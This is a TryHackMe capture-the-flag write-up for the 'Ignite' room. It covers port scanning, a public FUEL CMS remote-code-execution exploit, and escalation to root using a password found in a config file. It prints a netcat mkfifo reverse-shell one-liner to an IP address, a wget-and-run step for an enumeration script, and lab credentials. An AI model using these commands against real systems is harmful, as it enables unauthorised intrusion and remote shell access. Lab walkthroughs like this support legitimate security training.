# Ignite \(L\)

_TryHackMe_ – [**Ignite**](https://tryhackme.com/room/ignite) Write-Up

_topics_: web application security, Linux privilege escalation, public exploits, file transfering

1. **Plan**
2. **Enumeration**
3. **Local Privilege Escalation**
4. **Exploitation \(Root PrivEsc\)**

new tools:

tools: firefox browser, terminal, nmapAutomator, dirsearch, alias, searchsploit, python, cat, netcat, wget

## 1\) Plan

The hint is, a new startup is having issues with their webserver.

## 2\) Enumeration

following _./nmapAutomator.sh &lt;ip&gt; Basic_

PORT STATE SERVICE VERSION

80/tcp open http Apache httpd 2.4.18 \(\(Ubuntu\)\)

\|\_http-title: Welcome to FUEL CMS

it appears that only port 80 is open on HTTP and that the server is running **Apache httpd 2.4.18 \(Ubuntu\)**. This is the only open port on the machine so this has to be our way in.

## 3\) Local Privilege Escalation

Searching searchsploit yields a CVE, CVE-2019-0211 which is a root privilege escalation vulnerability for Apache.

![](.gitbook/assets/0.png)

This exploit looks promising but we don’t have time to wait until 6:25AM. Lets try searching searchsploit for the website type and version number. The website provides creds for the /fuel subdomain as admin:admin. Logging in reveals site documentation that says this website is FUEL CMS 1.4.

`alias “ss=searchsploit”`

`ss FUEL CMS 1.4` yields an exploit in the path **exploits/linux/webapps/47138.py, CVE-2018-16763**. The website allows PHP code evaluation via pages/select/ filter parameter to preview/data parameter, leading to R.C.E.

Inspecting the .py file lists an IP variable to use in place of the victim machine.

The exploit does not work out the box. I had to change the “input” var, uppercase URL \(change where applicable\), and uncommented the last 5 lines. The following exploit config worked for me

![](.gitbook/assets/1.png)

Following the editing, run `python /usr/share/exploitdb/exploits/linux/webapps/47138.py` which returns a shell. In order to execute commands, you must run them between quotations “ls.” To get a reverse shell, run the typical command to run on a victim machine and listen for the reverse shell with nc `"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.224.213 4445 >/tmp/f"`. I was able to get a low privilege reverse shell and retrieve the user.txt.

## 4\) Exploitation \(Root PrivEsc\)

Now that we have low level access to the machine, it is time to root. We can run linenum.sh \(_cd /tmp, wget &lt;ip&gt;/LinEnum.sh, chmod 777_\) to see if it suggests anything. LinEnum returns some potential attack vectors but none that are feasible. If we recheck the website for points of entry, it may reveal sensitive data. This option suggests there are

![](.gitbook/assets/2%20%281%29.png)

 usernames and passwords in the file **/**_**var/**_**www/html/fuel/application/config/database.php**. Inspecting the file reveals root creds \(root:mememe\). Because we now have the password we can just execute a reverse shell.

Because we don’t have full tty for an interactive shell, we need to find a way to create one. Python comes in handy with the command `python -c 'import pty; pty.spawn("/bin/bash")'` which creates the interactive shell. `su root` with password mememe and we have a root shell.

